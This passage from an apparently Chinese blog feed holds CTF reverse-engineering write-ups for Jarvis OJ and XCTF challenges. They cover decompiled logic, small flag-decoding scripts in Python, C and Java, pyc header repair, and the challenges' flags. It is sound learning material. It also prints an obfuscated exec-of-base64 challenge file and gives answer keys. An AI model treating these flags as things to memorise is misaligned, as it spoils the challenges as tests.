<h4 id="想将字符串转编码成base64要先将字符串转换成二进制数据">想将字符串转编码成base64,要先将字符串转换成二进制数据</h4>
<pre><code>url = &quot;https://www.cnblogs.com/songzhixue/&quot;
bytes_url = url.encode(&quot;utf-8&quot;)
str_url = base64.b64encode(bytes_url)  # 被编码的参数必须是二进制数据
print(str_url)

b'aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8='
</code></pre>
<h4 id="将base64解码成字符串">将base64解码成字符串</h4>
<pre><code>import base64
url = &quot;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc29uZ3poaXh1ZS8=&quot;
str_url = base64.b64decode(url).decode(&quot;utf-8&quot;)
print(str_url)

'https://www.cnblogs.com/songzhixue/'
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Jarvis OJ_re部分]]></title>
        <id>https://7usai.github.io/post/aUlplRi6E/</id>
        <link href="https://7usai.github.io/post/aUlplRi6E/">
        </link>
        <updated>2020-09-18T07:30:36.000Z</updated>
        <content type="html"><![CDATA[<h2 id="61dctfstheasy">[61dctf]stheasy</h2>
<p>主函数</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600414298392.png" alt="" loading="lazy"></figure>
<p>进入关键函数得，flag长度为29位</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600414303121.png" alt="" loading="lazy"></figure>
<p>byte_8049AE0和byte8049B15值如下</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600414307727.png" alt="" loading="lazy"></figure>
<p>写脚本</p>
<pre><code>a=[0x48,0x5D,0x8D,0x24,0x84,0x27,0x99,0x9F,0x54,0x18,0x1E,0x69,0x7E,0x33,0x15,0x72
   ,0x8D,0x33,0x24,0x63,0x21,0x54,0x0C,0x78,0x78,0x78,0x78,0x78,0x1B]
b='lk2j9Gh}AgfY4ds-a6QW1#k5ER_T[cvLbV7nOm3ZeX{CMt8SZo]U'
flag=''
for i in range(29):
    flag+=chr(ord(b[int(a[i]/3-2)]))
    print(flag)
</code></pre>
<p>得flag=kctf{YoU_hAVe-GOt-fLg_233333}</p>
<h2 id="dd-hello">DD - Hello</h2>
<p>关键函数</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600414334088.png" alt="" loading="lazy"></figure>
<p>V2等于start和sub_100000C90得地址之差再向右移动两位后于byte_10001040异或</p>
<p>地址于byte_10001040如下</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600414343342.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600414347990.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600414353508.png" alt="" loading="lazy"></p>
<p>脚本</p>
<pre><code>a= [0x41, 0x10, 0x11, 0x11, 0x1B, 0x0A, 0x64, 0x67, 0x6A, 0x68, 0x62, 0x68,
    0x6E, 0x67, 0x68, 0x6B, 0x62, 0x3D, 0x65, 0x6A, 0x6A, 0x3D, 0x68, 0x4,
    0x5, 0x8, 0x3, 0x2, 0x2, 0x55, 0x8, 0x5D, 0x61, 0x55, 0x0A, 0x5F, 0x0D
    , 0x5D, 0x61, 0x32, 0x17, 0x1D, 0x19, 0x1F, 0x18, 0x20, 0x4, 0x2, 0x12,
    0x16, 0x1E, 0x54, 0x20, 0x13, 0x14, 0x0, 0x0]
flag=''
v2=((0xCB0-0xC90)&gt;&gt;2)^(a[0])
for i in range(55):
    a[i]-=2
    a[i]^=v2
    i+=1
    v2+=1
    flag+=chr(a[i-1])
print(flag[1:])
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界_re_4星题_部分wp]]></title>
        <id>https://7usai.github.io/post/gong-fang-shi-jie-_re_4-xing-ti-_-bu-fen-wp/</id>
        <link href="https://7usai.github.io/post/gong-fang-shi-jie-_re_4-xing-ti-_-bu-fen-wp/">
        </link>
        <updated>2020-09-16T06:54:30.000Z</updated>
        <content type="html"><![CDATA[<h2 id="handcrafted-pyc">handcrafted-pyc</h2>
<h3 id="理解文件">理解文件</h3>
<p>得到了一个py文件</p>
<pre><code>#!/usr/bin/env python
# -*- coding: utf-8 -*-

import marshal, zlib, base64

exec(marshal.loads(zlib.decompress(base64.b64decode('eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ=='))))

</code></pre>
<p>经过搜索可得函数作用如下</p>
<p>base64.b64decode() ——base64解码<br>
zlib.decompress() ——解压缩<br>
marshal.loads() ——反序列化<br>
exec() ——将参数当做可执行文件运行</p>
<h3 id="写入文件">写入文件</h3>
<p>我们将解压缩后的文件写入文件中</p>
<pre><code>import zlib
import base64
d=zlib.decompress(base64.b64decode('eJyNVktv00AQXm/eL0igiaFA01IO4cIVCUGFBBJwqRAckLhEIQmtRfPwI0QIeio/hRO/hJ/CiStH2M/prj07diGRP43Hs9+MZ2fWMxbnP6mux+oK9xVMHPFViLdCTB0xkeKDFEFfTIU4E8KZq8dCvB4UlN3hGEsdddXU9QTLv1eFiGKGM4cKUgsFCNLFH7dFrS9poayFYmIZm1b0gyqxMOwJaU3r6xs9sW1ooakXuRv+un7Q0sIlLVzOCZq/XtsK2oTSYaZlStogXi1HV0iazoN2CV2HZeXqRQ54TlJRb7FUlKyUatISsdzo+P7UU1Gb1POdMruckepGwk9tIXQTftz2yBaT5JQovWvpSa6poJPuqgao+b9l5Aj/R+mLQIP4f6Q8Vb3g/5TB/TJxWGdZr9EQrmn99fwKtTvAZGU7wzS7GNpZpDm2JgCrr8wrmPoo54UqGampFIeS9ojXjc4E2yI06bq/4DRoUAc0nVnng4k6p7Ks0+j/S8z9V+NZ5dhmrJUM/y7JTJeRtnJ2TSYJvsFq3CQt/vnfqmQXt5KlpuRcIvDAmhnn2E0t9BJ3SvB/SfLWhuOWNiNVZ+h28g4wlwUp00w95si43rZ3r6+fUIEdgOZbQAsyFRRvBR6dla8KCzRdslar7WS+a5HFb39peIAmG7uZTHVm17Czxju4m6bayz8e7J40DzqM0jr0bmv9PmPvk6y5z57HU8wdTDHeiUJvBMAM4+0CpoAZ4BPgJeAYEAHmgAUgAHiAj4AVAGORtwd4AVgC3gEmgBBwCPgMWANOAQ8AbwBHgHuAp4D3gLuARwoGmNUizF/j4yDC5BWM1kNvvlxFA8xikRrBxHIUhutFMBlgQoshhPphGAXe/OggKqqb2cibxwuEXjUcQjccxi5eFRL1fDSbKrUhy2CMb2aLyepkegDWsBwPlrVC0/kLHmeCBQ=='))
f=open('bytecode','wb')
f.write(d)
</code></pre>
<p>open用法：https://www.runoob.com/python/python-func-open.html</p>
<h3 id="添加文件头">添加文件头</h3>
<p>更改后缀名为pyc时发现不能运行<img src="https://7usai.github.io/post-images/1600239334055.png" alt="" loading="lazy"></p>
<p>于是手动添加文件头</p>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600239343673.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600239349059.png" alt="" loading="lazy"></figure>
<p>这里我更改了两个pyc，两种都能运行但是可以看到5~8字节不同，上一个(就是444.pyc)是我在网上搜索得到的文件头，而1111.pyc是我自己编写py文件后转成pyc后得到的文件头，这里有一个知识</p>
<pre><code>pyc文件头部
- 前4个字节：03f3 0d0a，表示python版本
- 5-8个字节：0e6b 905d，表示pyc文件修改时间
</code></pre>
<p>具体可参考https://www.cnblogs.com/blili/p/11799483.html</p>
<p>添加文件头后我们发现可以运行了</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600239355890.png" alt="" loading="lazy"></figure>
<h3 id="pyc转为py">pyc转为py</h3>
<p>通过uncompyle6将其转为py文件</p>
<pre><code>uncompyle6 -o 123.py 1111.pyc
</code></pre>
<p><img src="https://7usai.github.io/post-images/1600239362899.png" alt="" loading="lazy"><br>
2k多行这里只截一部分</p>
<p>将LOAD_CONST后面的所有数字转为ascii码</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600239369086.png" alt="" loading="lazy"></figure>
<p><img src="https://7usai.github.io/post-images/1600239375580.png" alt="" loading="lazy"><br>
再次分析我们可知他是4个字符为一组</p>
<h3 id="观察规律尝试解密">观察规律尝试解密</h3>
<p>将乱序得flag尝试4个为一组倒叙得<br>
hitcon{Now y</p>
<p>神似flag，最终全部倒叙得flag=hitcon{Now you can compile and run Python bytecode in your brain!}</p>
<h3 id="总结">总结</h3>
<p>很费时间，学习了pyc文件格式，学习了uncompyle6<br>
<img src="https://7usai.github.io/post-images/1600239447558.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界_re_3星题_部分wp]]></title>
        <id>https://7usai.github.io/post/gong-fang-shi-jie-_re_3-xing-ti-_-bu-fen-wp/</id>
        <link href="https://7usai.github.io/post/gong-fang-shi-jie-_re_3-xing-ti-_-bu-fen-wp/">
        </link>
        <updated>2020-09-14T15:05:52.000Z</updated>
        <content type="html"><![CDATA[<h1 id="攻防世界_re_3星题__部分wp">攻防世界_re_3星题__部分wp</h1>
<h2 id="debug">debug</h2>
<h3 id="先用de4dot进行脱壳">先用de4dot进行脱壳</h3>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1600095989406.png" alt="" loading="lazy"></figure>
<h3 id="放入dnspy调试">放入dnSpy调试</h3>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1600095996901.png" alt="" loading="lazy"></figure>
<p>找到main函数所在位置，很简单，a相当于输入的数，b就是经过一系列加密后得到的flag,下入断点运行就得到了flag<br>
<img src="https://7usai.github.io/post-images/1600096004477.png" alt="" loading="lazy"></p>
<h2 id="hackme">hackme</h2>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1600096012245.png" alt="" loading="lazy"></figure>
<h3 id="主函数">主函数</h3>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1600096022965.png" alt="" loading="lazy"></figure>
<h3 id="思路网上借鉴的">思路(网上借鉴的)</h3>
<p>sub_406D90为随机数生成函数，且seed为固定值</p>
<p>重点是要理解这个函数的逻辑是啥。。虽然这个判断只取了有输入字符串的10个字符，但是实际上需要输入的字符串是22位（也就是实际上flag有22个char）。。</p>
<p>之后程序会从这里面随机选择一个数字i，然后从byte_6B4270和输入的字符串中分别取出第i个字符v16和v15，将v15的内容和一个生成的大数进行异或运算与v16比较。</p>
<p>整体逻辑如上，而且我们发现，这个i具体是多少其实是不需要的，因为这个i是随机生成的用于检验得到的flag的（理解这点后题目就变得十分简单了），所以我们需要做的时按程序正向逻辑进行爆破或者逆向生成这flag即可。</p>
<p>需要注意的是，虽然很多时候这种类似 unsigned __int8 的信息会被我们忽略， 但是在本题中它是非常重要的， 它标表示这个数被转型为8个bit长（也就是只有一个字节，刚好是我们ascii表的范围），故脚本中我们需要与上一个0xff</p>
<h3 id="脚本">脚本</h3>
<pre><code>a=[0x5F ,0xF2 ,0x5E ,0x8B ,0x4E ,0x0E ,0xA3 ,0xAA ,0xC7 ,0x93 ,0x81 ,
   0x3D ,0x5F ,0x74 ,0xA3 ,0x09 ,0x91 ,0x2B, 0x49 ,0x28 ,0x93 ,0x67]
flag=''
for i in range(22):
    v14=i+1
    v18=0
    v19=0
    while v18&lt;v14:
        v18+=1
        v19=1828812941 * v19 + 12345
    flag+=chr((a[i]^v19)&amp;0xff)
print(flag)
</code></pre>
<h2 id="babyre">BABYRE</h2>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1600096037348.png" alt="" loading="lazy"></figure>
<p>GDB还不会，等学会了再写</p>
<h2 id="crackme">crackme</h2>
<h3 id="脱壳">脱壳</h3>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1600096045818.png" alt="" loading="lazy"></figure>
<h3 id="主函数-2">主函数</h3>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1600096054533.png" alt="" loading="lazy"></figure>
<p>很简单，异或一下就行</p>
<p>dword_402150值如下</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1600096060907.png" alt="" loading="lazy"></figure>
<h3 id="脚本-2">脚本</h3>
<pre><code>a=[0x12,0x04,0x08,0x14,0x24,0x5C,0x4A,0x3D,0x56,0x0A,0x10,0x67,0x00,0x41,0x00,0x01,0x46,0x5A,0x44,0x42,0x6E,0x0C,0x44,0x72,0x0C,0x0D,0x40,0x3E,0x4B,0x5F,0x02,0x01,0x4C,0x5E,0x5B,0x17,0x6E,0x0C,0x16,0x68,0x5B,0x12]
flag=''
e='this_is_not_flag'
for i in range(42):
    flag+=chr(ord(e[i%16])^a[i])
print (flag)
</code></pre>
<h2 id="apk-逆向2">APK-逆向2</h2>
<h3 id="主函数-3">主函数</h3>
<p><img src="https://7usai.github.io/post-images/1600096069499.png" alt="" loading="lazy"><br>
大致意思是通过31337端口向主机发送flag</p>
<h3 id="python脚本">python脚本</h3>
<pre><code>import http.server

server_address = ('127.0.0.1', 31337)
handler_class = http.server.BaseHTTPRequestHandler
httpd = http.server.HTTPServer(server_address, handler_class)
httpd.serve_forever()
</code></pre>
<h3 id="结果">结果</h3>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1600096078531.png" alt="" loading="lazy"></figure>
<h2 id="babymips">babymips</h2>
<p>需要配置JDK环境并且安装Ghidra</p>
<h3 id="主函数-4">主函数</h3>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1600096092065.png" alt="" loading="lazy"></figure>
<p>abStack44为输入的字符，之后进行32次异或：abStack44[i]=abStack44[i]^0x20-char[i]<br>
iVar1处转换后前5位是Q|j{g<img src="https://7usai.github.io/post-images/1600096112265.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600096100128.png" alt="" loading="lazy"></p>
<p>uStack16为偶数时相当于&lt;&lt;2|&gt;&gt;6为奇数时相当于&gt;&gt;2|&lt;&lt;6</p>
<h3 id="脚本-3">脚本</h3>
<pre><code>a=[0x51, 0x7C, 0x6A, 0x7B, 0x67,
  0x52, 0xFD, 0x16, 0xA4, 0x89, 0xBD, 0x92, 0x80, 0x13, 0x41,
  0x54, 0xA0, 0x8D, 0x45, 0x18, 0x81, 0xDE, 0xFC, 0x95, 0xF0,
  0x16, 0x79, 0x1A, 0x15, 0x5B, 0x75, 0x1F, 0x00]
flag=''
for i in range(5,32):
    if((i&amp;1)!=0):
        a[i]=a[i]&gt;&gt;6|(a[i]&lt;&lt;2)%0x100
    else:
        a[i]=(a[i]&lt;&lt;6)%0x100|a[i]&gt;&gt;2
for i in range(32):
    a[i]=a[i]^32-i
    flag+=chr(a[i])
print(flag)
</code></pre>
<p>注意这里的%0x100需要加上不然失败</p>
<h2 id="reverse-for-the-holy-grail-350">reverse-for-the-holy-grail-350</h2>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1600161580746.png" alt="" loading="lazy"></figure>
<h3 id="主函数-5">主函数</h3>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1600161585732.png" alt="" loading="lazy"></figure>
<h3 id="关键函数stringmod">关键函数stringmod</h3>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600161590750.png" alt="" loading="lazy"></figure>
<h3 id="脚本-4">脚本</h3>
<pre><code>firstchar=[0x41,0x69,0x6E,0x45,0x6F,0x61]
thirdchar=[0x2EF,0x2C4,0x2DC,0x2C7,0x2ED,0x2FC]
masterArray=[0x1D7,0x0C,0x244,0x25E,0x93,0x6C]
flag=[0 for i in range(18)]
t=[]
v7=666
temp=0
for i in range(18):
    t.append(v7)
    v7+=v7%5
    if i % 3==0:
        flag[i]=firstchar[temp]
        temp+=1
temp=0
for i in range(2,18,3):
    flag[i]=thirdchar[temp]^t[i]
    temp+=1
temp=0
for i in range (1,18,3):
    for j in range(32,127):
        if((flag[i-1]^t[i-1])*(j^t[i])%(flag[i+1]^t[i+1]))==masterArray[temp]:
            temp+=1
            flag[i]=j
            break
print('tuctf{'+''.join(map(chr,flag))+'}')
</code></pre>
<p>这里得到的是tuctf{AfricanOrEuro Va ?}不知道为什么<br>
如果有想交流的可以发送邮件<br>
实际flag=tuctf{AfricanOrEuropean?}</p>
<h2 id="serial-150">serial-150</h2>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600240488845.png" alt="" loading="lazy"></figure>
<p>注意按字符顺序打印flag，比如208-&gt;208_1_1....</p>
<h2 id="key">key</h2>
<h3 id="主函数-6">主函数</h3>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1600240503658.png" alt="" loading="lazy"></figure>
<p>关键函数是sub_4021E0，大致意思就是将后两个参数进行异或放入第一个参数，</p>
<p><img src="https://7usai.github.io/post-images/1600240522266.png" alt="" loading="lazy"><br>
<img src="https://7usai.github.io/post-images/1600240536879.png" alt="" loading="lazy">这里可以看到后两个参数是什么</p>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1600240546193.png" alt="" loading="lazy"></figure>
<p>这里也可以但是注意这里是倒叙存储的</p>
<h3 id="编写脚本">编写脚本</h3>
<pre><code>a='themidathemidathemida'
b='&gt;----++++....&lt;&lt;&lt;&lt;.'
c=''
flag=''
for i in range(len(b)):
    c+=chr((ord(a[i])^ord(b[i]))+22)
for i in c:
    flag+=chr(ord(i)+9)
print(flag)
</code></pre>
<p>得flag=idg_cni~bjbfi|gsxb</p>
<h3 id="gametime">gametime</h3>
<h3 id="思路">思路</h3>
<p>运行一边程序后找错误时的字符串所在函数<br>
<img src="https://7usai.github.io/post-images/1600240563079.png" alt="" loading="lazy"><br>
如上，就是要让sub_401260(xxxxx)!=0</p>
<h3 id="进入sub_401260函数">进入sub_401260函数</h3>
<p><img src="https://7usai.github.io/post-images/1600240572593.png" alt="" loading="lazy"><br>
这里有帮助的是v4存在了eax里，最终return的是eax的值<br>
<img src="https://7usai.github.io/post-images/1600240579914.png" alt="" loading="lazy"><br>
看思维图可知loc_4012AD对eax清零了，于是我们就要修改错误跳转</p>
<h3 id="修改错误跳转">修改错误跳转</h3>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1600240594564.png" alt="" loading="lazy"></figure>
<h3 id="运行得flag">运行得flag</h3>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1600240610853.png" alt="" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[攻防世界_re_2星题_部分wp]]></title>
        <id>https://7usai.github.io/post/gong-fang-shi-jie-re-bu-fen-wp/</id>
        <link href="https://7usai.github.io/post/gong-fang-shi-jie-re-bu-fen-wp/">
        </link>
        <updated>2020-09-10T14:38:31.000Z</updated>
        <content type="html"><![CDATA[<h1 id="攻防世界re部分wp">攻防世界RE部分wp</h1>
<h2 id="re2-cpp-is-awesome">re2-cpp-is-awesome</h2>
<figure data-type="image" tabindex="1"><img src="https://7usai.github.io/post-images/1599748738949.png" alt="" loading="lazy"></figure>
<p>64位ELF文件 放入ubuntu中运行结果如下</p>
<figure data-type="image" tabindex="2"><img src="https://7usai.github.io/post-images/1599748743703.png" alt="" loading="lazy"></figure>
<p>放入IDA进入main函数</p>
<p><img src="https://7usai.github.io/post-images/1599748750390.png" alt="" loading="lazy"><br>
如下两个 一个正确一个错误</p>
<figure data-type="image" tabindex="3"><img src="https://7usai.github.io/post-images/1599748769934.png" alt="" loading="lazy"></figure>
<p>通过分析可得</p>
<figure data-type="image" tabindex="4"><img src="https://7usai.github.io/post-images/1599748776529.png" alt="" loading="lazy"></figure>
<p>V12与off_6020A0和dword_6020C0组成的数组比较，相同则得flag</p>
<figure data-type="image" tabindex="5"><img src="https://7usai.github.io/post-images/1599748784955.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="6"><img src="https://7usai.github.io/post-images/1599748790751.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="7"><img src="https://7usai.github.io/post-images/1599748796928.png" alt="" loading="lazy"></figure>
<p>得到所需数值后编写函数</p>
<pre><code>a=[0x24,0x00,0x05,0x36,0x65,0x07,0x27,0x26,0x2d,0x01,0x03,0x00,0x0d,0x56,0x01,0x03,0x65,0x03,0x2d,0x16,0x02,0x15,0x03,0x65,0x00,0x29,0x44,0x44,0x01,0x44,0x2b]
flag=&quot; &quot;
x=&quot;L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t&quot;
b=len(a)
for i in range(b):
    flag+=x[a[i]]
print(flag)
</code></pre>
<pre><code>得flag=ALEXCTF{W3_L0v3_C_W1th_CL45535}
</code></pre>
<h2 id="srm-50">srm-50</h2>
<p>主要部分如下</p>
<figure data-type="image" tabindex="8"><img src="https://7usai.github.io/post-images/1599748819043.png" alt="" loading="lazy"></figure>
<p>if部分成立时得flag,说明flag长度为16位，前四位是CZ9d<br>
<img src="https://7usai.github.io/post-images/1599748824045.png" alt="" loading="lazy"><br>
V13<sub>V24组成其余12位，求出V12[4]</sub>V24即可</p>
<figure data-type="image" tabindex="9"><img src="https://7usai.github.io/post-images/1599748829235.png" alt="" loading="lazy"></figure>
<p>编写代码</p>
<pre><code>a=[67,90,57,100,109,113,52,99,56,103,57,71,55,98,65,88]
flag=&quot; &quot;
for i in range(len(a)):
    flag+=chr(a[i])
print(flag)

</code></pre>
<pre><code>得flag为CZ9dmq4c8g9G7bAX
</code></pre>
<h2 id="guess-the-number">Guess-the-Number</h2>
<figure data-type="image" tabindex="10"><img src="https://7usai.github.io/post-images/1599748835634.png" alt="" loading="lazy"></figure>
<p>转为zip解压后得<img src="https://7usai.github.io/post-images/1599748846528.png" alt="" loading="lazy"></p>
<figure data-type="image" tabindex="11"><img src="https://7usai.github.io/post-images/1599748854085.png" alt="" loading="lazy"></figure>
<p>编写脚本</p>
<figure data-type="image" tabindex="12"><img src="https://7usai.github.io/post-images/1599748864158.png" alt="" loading="lazy"></figure>
<pre><code>import java.math.BigInteger;

class Untitled {
	public static void main(String[] args) {
          String str_one = &quot;4b64ca12ace755516c178f72d05d7061&quot;;
          String str_two = &quot;ecd44646cfe5994ebeb35bf922e25dba&quot;;
		  BigInteger i1 = new BigInteger(str_one, 16);
   		  BigInteger i2 = new BigInteger(str_two, 16);
   		  BigInteger res = i1.xor(i2);
    	  String result = res.toString(16);
          System.out.printf(&quot;%s&quot;,result);
	}
}
得flag=a7b08c546302cc1fd2a4d48bf2bf2ddb
</code></pre>
<h3 id="收获第一次反编译java">收获：第一次反编译java</h3>
<h2 id="666">666</h2>
<p>主函数</p>
<figure data-type="image" tabindex="13"><img src="https://7usai.github.io/post-images/1600000477839.png" alt="" loading="lazy"></figure>
<p>主要加密函数</p>
<figure data-type="image" tabindex="14"><img src="https://7usai.github.io/post-images/1600000482916.png" alt="" loading="lazy"></figure>
<pre><code>a2=[0x69,0x7A,0x77,0x68,0x72,0x6F,0x7A,0x22,0x22,0x77,0x22,0x76,0x2E,0x4B,0x22,0x2E,0x4E,0x69]
flag=''
for i in range(0,18,3):
    flag += chr(18 ^ a2[i] - 6)
    flag += chr(18 ^ a2[i + 1] + 6)
    flag += chr(18 ^ a2[i+2] ^ 6)
print(flag)
</code></pre>
<p>编写代码，得flag</p>
<p>注：我python一直显示一个错误的flag<img src="https://7usai.github.io/post-images/1600000495622.png" alt="" loading="lazy"></p>
<p>c++代码如下：</p>
<pre><code>#include&lt;stdio.h&gt;
int main()
{
char i;
char target[]=&quot;izwhroz\&quot;\&quot;w\&quot;v.K\&quot;.Ni&quot;;
for(i=0;i&lt;18;i+=3){
    target[i]=(target[i]^18)-6;
    target[i+1]=(target[i+1]^18)+6;
    target[i+2]=(target[i+2]^18)^6;
}
puts(target);
return 0;
}
</code></pre>
<h2 id="2020913第一面完成">2020.9.13第一面完成</h2>
<figure data-type="image" tabindex="15"><img src="https://7usai.github.io/post-images/1600000504111.png" alt="" loading="lazy"></figure>
<h2 id="reverseme-120">ReverseMe-120</h2>
<h3 id="main函数">main函数</h3>
<p><img src="https://7usai.github.io/post-images/1600010757978.png" alt="" loading="lazy"><br>
大概思路是需要v9=0；v9=0的前提是v13=you_know_how_to_remove_junk_code；v13是经过异或的得到的，写脚本得之前的v13如下</p>
<pre><code>a='you_know_how_to_remove_junk_code'
b=''
c=len(a)
for i in range(c):
    b+=chr(ord(a[i])^37)
    print(b)
</code></pre>
<p>得到字符串\JPzNKJRzMJRzQJzW@HJS@zOPKNzFJA@这里失去头绪</p>
<p>sub_401000函数没看懂；但是查看字符串发现<img src="https://7usai.github.io/post-images/1600010779978.png" alt="" loading="lazy"><br>
猜测是base64;</p>
<p>在线加密后得XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=，即为flag</p>
<h2 id="reversing-x64elf-100">Reversing-x64Elf-100</h2>
<figure data-type="image" tabindex="16"><img src="https://7usai.github.io/post-images/1600010785917.png" alt="" loading="lazy"></figure>
<h3 id="主函数">主函数</h3>
<figure data-type="image" tabindex="17"><img src="https://7usai.github.io/post-images/1600010790350.png" alt="" loading="lazy"></figure>
<h3 id="关键函数">关键函数</h3>
<figure data-type="image" tabindex="18"><img src="https://7usai.github.io/post-images/1600010796725.png" alt="" loading="lazy"></figure>
<h3 id="思路">思路</h3>
<p>flag存在a1数组里，逆向进行if里得运算就行<br>
编写脚本</p>
<pre><code>v3 = [&quot;Dufhbmf&quot;,&quot;pG`imos&quot;,&quot;ewUglpt&quot;]
flag=''
for i in range(12):
    flag+=chr(ord(v3[(i % 3)][2 * int(i / 3)])-1)
    print(flag)
</code></pre>
<pre><code>v3[a][b]的意思
a表示下标为a的字符串，b表示此字符串中下标为b的字符
</code></pre>
<h2 id="igniteme">IgniteMe</h2>
<h3 id="main函数-2">main函数</h3>
<figure data-type="image" tabindex="19"><img src="https://7usai.github.io/post-images/1600010801875.png" alt="" loading="lazy"></figure>
<h3 id="进入4011c0">进入4011C0</h3>
<figure data-type="image" tabindex="20"><img src="https://7usai.github.io/post-images/1600010805986.png" alt="" loading="lazy"></figure>
<p>这里byte_4420B0我简单的用一个a表示<img src="https://7usai.github.io/post-images/1600010832666.png" alt="" loading="lazy"></p>
<h3 id="编写脚本">编写脚本</h3>
<pre><code>v7=&quot;GONDPHyGjPEKruv{{pj]X@rF&quot;
a=[0x0D,0x13 ,0x17 ,0x11 ,0x02 ,0x01 ,0x20 ,0x1D,0x0C ,0x02 ,0x19 ,0x2F ,0x17 ,0x2B ,0x24 ,0x1F,0x1E ,
   0x16 ,0x09 ,0x0F ,0x15 ,0x27 ,0x13 ,0x26 ,0x0A ,0x2F ,0x1E ,0x1A ,0x2D ,0x0C ,0x22 ,0x04]
v5=''
eflag=''
for i in range(len(v7)):
    v5+=chr(ord(v7[i])^a[i])
for i in range(len(v5)):
    eflag+=chr((ord(v5[i])-72)^0x55)
    print(eflag)
</code></pre>
<p>这里注意最后得到的flag值需要大小写转换，因为懒没写代码</p>
<p>在网上找的代码如下</p>
<pre><code>for i in range(len(eflag)):
    if ord(eflag[i]) &gt;= 97 and ord(eflag[i]) &lt;= 122:
        flag += chr(ord(eflag[i]) - 32)
    elif ord(eflag[i]) &gt;= 65 and ord(eflag[i]) &lt;= 90:
        flag += chr(ord(eflag[i]) + 32)
    else:
        flag += eflag[i]
</code></pre>
<p>再与<img src="https://7usai.github.io/post-images/1600010822260.png" alt="" loading="lazy">连接，得flag=EIS{wadx_tdgk_aihc_ihkn_pjlm}</p>
<h2 id="总结">总结</h2>
<p>二星题还是很简单的，部分题目自己觉得没有学习意义就没写wp</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Scrambled Eggs (csictf 2020) 转载！！]]></title>
        <id>https://7usai.github.io/post/scrambled-eggs-csictf-2020-zhuan-zai/</id>
        <link href="https://7usai.github.io/post/scrambled-eggs-csictf-2020-zhuan-zai/">
        </link>
